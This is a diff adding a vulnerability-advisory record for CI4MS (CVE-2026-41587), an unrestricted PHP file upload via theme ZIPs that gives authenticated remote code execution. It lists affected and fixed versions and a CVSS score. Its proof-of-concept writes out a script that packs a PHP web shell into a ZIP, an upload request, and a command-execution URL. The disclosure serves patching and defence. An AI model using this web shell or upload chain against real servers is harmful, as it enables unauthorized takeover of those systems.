@@ -1,0 +1,102 @@
+advisory_id: GHSA-fw49-9xq4-gmx6
+datasource_id: github_osv/GHSA-fw49-9xq4-gmx6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fw49-9xq4-gmx6/GHSA-fw49-9xq4-gmx6.json
+aliases:
+  - CVE-2026-41587
+summary: "CI4MS has Unrestricted PHP File Upload via Theme Installation that Leads to Authenticated\
+  \ Remote Code Execution\n### Summary\nA theme upload feature allows any authenticated backend\
+  \ user with theme-upload permission to achieve remote code execution (RCE) by uploading a\
+  \ crafted ZIP file. PHP files inside the ZIP are installed into the web-accessible public/\
+  \ directory with no extension or content filtering, making them directly executable via HTTP.\n\
+  \n\n### Details\nFile: `modules/Theme/Controllers/Theme.php`\n\nAfter a ZIP is uploaded and\
+  \ extracted to a temporary directory, install_theme_from_tmp() is called unconditionally:\
+  \ Theme.php:51-52\n\nFile: `modules/Theme/Helpers/themes_helper.php`\n\nThe helper copies\
+  \ every file matching *.* from `public/templates/<name>/` inside the ZIP directly into `public/templates/<name>/`\
+  \ on disk using rename(), with no file-extension allowlist, no MIME check, and no content\
+  \ inspection: `themes_helper.php:60-68`\n\nBecause the web root is `public/`, any `.php` file\
+  \ placed there is directly reachable over HTTP.\n\nPHP files are also installed — without\
+  \ filtering — into app/Controllers/templates/<name>/, app/Libraries/templates/<name>/, and\
+  \ other app/ subdirectories: `themes_helper.php:31-42`\n\nThe theme name is derived from the\
+  \ uploaded filename via `str_replace('_theme.zip', '', $file->getName())`, so uploading `evil_theme.zip`\
+  \ sets the theme name to evil and the install target to `public/templates/evil/`: `Theme.php:20`\n\
+  \n### PoC\nPrerequisites: A backend account with theme upload permission (e.g., backend/themes/upload).\n\
+  \nStep 1 — Build the malicious ZIP:\n```\nimport zipfile, io  \n  \nbuf = io.BytesIO()  \n\
+  with zipfile.ZipFile(buf, 'w') as z:  \n    z.writestr('public/templates/evil/shell.php',\
+  \ '<?php system($_GET[\"c\"]); ?>')  \nbuf.seek(0)  \nwith open('evil_theme.zip', 'wb') as\
+  \ f:  \n    f.write(buf.read())\n```\nStep 2 — Upload:\n```\nPOST /backend/themes/upload \
+  \ \nContent-Type: multipart/form-data  \n  \nfield name: theme  \nfile:       evil_theme.zip\
+  \  \n```\nStep 3 — Execute:\n```\nGET https://target.com/templates/evil/shell.php?c=id  \n\
+  ```\nExpected response: output of id (e.g., uid=33(www-data) gid=33(www-data) groups=33(www-data)).\n\
+  \n\n### Impact\nType: Authenticated Remote Code Execution (RCE) via arbitrary file write to\
+  \ the web root.\n\nWho is impacted: Any deployment where a backend user has been granted theme\
+  \ upload permission. A superadmin already has full access, but any lower-privileged role granted\
+  \ this permission can use it to write and execute arbitrary PHP on the server, gaining OS-level\
+  \ command execution under the web server process. This can be used for data exfiltration,\
+  \ lateral movement, persistence, or full server compromise."
+impacted_packages:
+  - purl: pkg:github/ci4-cms-erp/ci4ms
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/ci4-cms-erp/ci4ms
+        commit: b969465e71eacd9eb57014ad1fce1fc34fa7bca0
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:composer/ci4-cms-erp/ci4ms
+    affected_versions: vers:composer/>=0.26.0+0|<=0.31.6+0
+    fixed_versions: vers:composer/0.31.7+0
+    affected_packages:
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.0%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.1%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.2%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.3%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.3%2B1
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.3%2B2
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.3%2B3
+      - pkg:composer/ci4-cms-erp/ci4ms@0.26.3%2B4
+      - pkg:composer/ci4-cms-erp/ci4ms@0.27.0%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.28.0%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.28.3%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.28.4%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.28.5%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.28.6%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.0%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.1%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.2%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.3%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.4%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.5%2B0
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.6%2B0
+    fixed_packages:
+      - pkg:composer/ci4-cms-erp/ci4ms@0.31.7%2B0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fw49-9xq4-gmx6/GHSA-fw49-9xq4-gmx6.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-434
+references:
+  - url: https://github.com/ci4-cms-erp/ci4ms
+    reference_type:
+    reference_id:
+  - url: https://github.com/ci4-cms-erp/ci4ms/commit/b969465e71eacd9eb57014ad1fce1fc34fa7bca0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-41587
+    reference_type:
+    reference_id: CVE-2026-41587
+  - url: https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-fw49-9xq4-gmx6
+    reference_type:
+    reference_id: GHSA-fw49-9xq4-gmx6
+exploits: []
